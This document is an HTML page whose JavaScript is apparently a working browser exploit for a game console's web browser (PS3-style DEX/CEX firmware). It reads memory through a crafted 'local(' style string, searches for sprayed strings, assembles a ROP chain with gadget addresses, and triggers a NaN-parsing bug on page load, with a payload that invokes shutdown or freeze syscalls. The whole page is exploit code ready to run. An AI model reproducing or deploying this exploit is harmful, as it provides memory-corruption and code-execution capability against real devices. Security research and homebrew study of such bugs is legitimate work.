<html>
<script src="include/jquery.js"></script>
<script src="include/utils.js"></script>
<script src="include/IEEE754.js"></script>
<head>
<script>
function Repeat(s, n)
{
	var a = [];
	
	while(a.length < n)
	{
		a.push(s);
	}
	return a.join('');
}

function readMemory(address, size)
{
	var exploit = document.getElementById('exploit');
	exploit.style.src = 'local(' + generateExploit(address, size) + ')';
	return exploit.style.src;
}

function hexh2bin(hex_val)
{
	var str = "";
	var half = hex_val & 0xFFFF;
	
	// get hex
	str = half.toString(16);
	
	// pad as needed
	if (str.length < 3)
	{
		str = "%" + Repeat("0", 2 - str.length) + str;
	}
	else
	{
		str = "%u" + Repeat("0", 4 - str.length) + str;;
	}
	
	return unescape(str);
}

String.prototype.replaceAt=function(index, char) 
{
	return this.substr(0, index) + char + this.substr(index+char.length);
}

function findExploit(name,exploit_data,pattern,len)
{
	try
	{
		while (1)
		{
			var search_base = 0x80200000;
			var search_size = 0x0027500;
			
			var dat = readMemory(search_base, search_size);
			
			// move past "local("
			dat = dat.substr(6, search_size);
			
			// loop for tag
			for (var i = 0; i < (search_size*2); i += 0x10)
			//for (var i = 0; i < (20000*0x10); i += 0x10)
			{
				if (i > 20000*0x10) {return 0;}
				if (dat.charCodeAt(i/2) == pattern)
				{
					var match = 0;
					
					// loop next 5 bits
					for (var k = 0; k < len; k+=2)
					{
						// convert to string
						if (dat.charCodeAt((i+k)/2) != exploit_data.charCodeAt(k/2))
						{
							break;
						}
						// increment match
						match += 2;
					}
					
					// we got a complete match
					if (match == len)
					{
						// hold exploit addr
						var exploit_addr = search_base + i + 2;
						
						// display the exploit address
						dbg("Found " + name + " at: " + exploit_addr.toString(16));
						//dbg("Loop: "+(i/0x10));
						dat=null;
						return exploit_addr;
					}
				}
			}
			dat=null;			
		}
		dbg("string var could not be located in search range.");
		return 0;
	} 
	catch(e) 
	{
		dbg(e);
	}
}

function trigger(exploit_addr)
{
	// dump data
	var span = document.createElement("div");
	document.getElementById("BodyID").appendChild(span);
	span.innerHTML = -parseFloat("NAN(ffffe" + exploit_addr.toString(16) + ")");
}

function initROP(){
	
	try
	{
		var gadget,payload,jump_1,j1,jp,payload_jump_1,payload_jump_2;
		var gadget_addr=0;
		var jump_1_addr=0;
		var jump_2_addr=0;
		var payload_jump_1_addr=0;
		var payload_jump_2_addr=0;
		var payload_jump_1_bytes=0xBEEFCAFE;
		var payload_jump_2_bytes=0xDEADBABE;
        var trigger_state = false;
				
		dbg("Processing gadget string.. Searching for valid offset....");			
		do{
		
		gadget =  unescape("\u7E2F\u000C\u6730\u7E2F"); //for DEX - 3 beeps + shutdown [sys_sm_ring_buzzer   + sys_sm_shutdown ]
		//gadget =  unescape("\u7E2F\u000C\u5234\u7E2F"); //for CEX - 3 beeps + shutdown [sys_sm_ring_buzzer   + sys_sm_shutdown ]
		//gadget =  unescape("\u7E2F\u0044\uE8CC\u7E2F"); //for DEX - 3 beeps + freeze
		//gadget =  unescape("\u7E2F\u0044\u6CD8\u7E2F"); //for CEX - 3 beeps + freeze
		
		
		// Working, well it does the syscalls
		//gadget =  unescape("\u7E2F\u000C\u6740\u7E2F"); //  sys_sm_shutdown 
		//gadget =  unescape("\u7E2F\u0061\u04E0\u7E2F"); //  sys_process_exit 
		
		
		gadget_addr = findExploit("gadget",gadget,0x7E2F,0x4);
		}
		while(gadget_addr==0);
		
		dbg("Processing payload string.. Searching for valid offset....");	
		do{
		//payload = unescape("\u4343\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\u4141\u4141\u2A2F");
		payload = unescape("\u4343\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\u4343\u4343\u7E2F\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\u4242\u4242\u7E2F\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\u4141\u4141\u7E2F");
		payload = payload.replaceAt(0x32/2, hexh2bin((gadget_addr) >> 16));
		payload = payload.replaceAt(0x34/2, hexh2bin(gadget_addr));
		jp = payload.replaceAt(0x00/2,hexh2bin(0x7E2F));
		payload_addr = findExploit("jp",jp,0x7E2F,0x1C);
		}
		while(payload_addr==0);


		// Write Jump Addresses In Payload
		dbg("Processing Additional Jump Addresses In Payload....");

		// Write 1st Jump Address In Payload
		payload = payload.replaceAt(0x22 / 2, hexh2bin((payload_jump_1_bytes) >> 16));
		payload = payload.replaceAt(0x24 / 2, hexh2bin(payload_jump_1_bytes));
		payload_jump_1_addr = payload_addr + 0x20 / 2;
		//alert("payload_jump_1_addr Found at: " + payload_jump_1_addr.toString(16));

		// Write 2nd Jump Address In Payload
		payload = payload.replaceAt(0x12 / 2, hexh2bin((payload_jump_2_bytes) >> 16));
		payload = payload.replaceAt(0x14 / 2, hexh2bin(payload_jump_2_bytes));
		payload_jump_2_addr = payload_addr + 0x20 / 2 + 0x10 / 2 + 0x8;
		//alert("payload_jump_2_addr Found at: " + payload_jump_2_addr.toString(16));
		
		dbg("Processing jump_1 string.. Searching for valid offset....");
		do{
		jump_1 = unescape("\u4141\u4141\u4141\u7E2F");
		jump_1 = jump_1.replaceAt(0x02/2, hexh2bin((payload_addr) >> 16));
		jump_1 = jump_1.replaceAt(0x04/2, hexh2bin(payload_addr));
		j1 = jump_1.replaceAt(0x00/2,hexh2bin(0x7E2F));
		jump_1_addr = findExploit("j1",j1,0x7E2F,0x4);
		}
		while(jump_1_addr==0);
		
		dbg("All required offsets have been found....");
		dbg("gadget: "+a2hex(gadget));
		dbg("gadget variable offset: "+gadget_addr.toString(16));
		dbg("payload: "+a2hex(payload));
		dbg("payload variable offset: "+payload_addr.toString(16));
		dbg("gadget jump_1: "+a2hex(j1));
		dbg("jump_1 variable offset: "+jump_1_addr.toString(16));	
		dbg("payload_jump_1 variable offset: "+payload_jump_1_addr.toString(16));	
		dbg("payload_jump_2 variable offset: "+payload_jump_2_addr.toString(16));	
		dbg("Triggering exploit....");
		
		// Show address info
		alert("Exploit Details\nPress OK To Proceed....\n" + "\ngadget offset (r11): " + gadget_addr.toString(16) + "\npayload_addr offset (r9): " + payload_addr.toString(16) + "\njump_1_addr offset (r4): " + jump_1_addr.toString(16) + "\npayload_jump_1_addr offset: " + payload_jump_1_addr.toString(16) + "\npayload_jump_2_addr offset: " + payload_jump_2_addr.toString(16));


		// Check trigger state
		if (confirm('Proceed To Trigger?')) {
			//alert('trigger ' + jump_1_addr.toString(16));
			trigger(jump_1_addr);
			trigger_state = true;
		} else {
			trigger_state = false
		}

		// Refresh Page?
		if (!trigger_state) {
			if (confirm('Refresh Page?')) {
				location.reload();
			} else {
				return;
			}
		}

		trigger_state = false;
		
		//trigger(jump_1_addr);		
		return;
	} catch(e) {
		dbg(e);
	}
}

</script>
</head>
<body id="BodyID" onload="initROP();">
		If this message appears, reload page because exploit failed!<br>
		<div id="exploit" />
		<br>
		<div id="log"></div>
	</body>
</html>
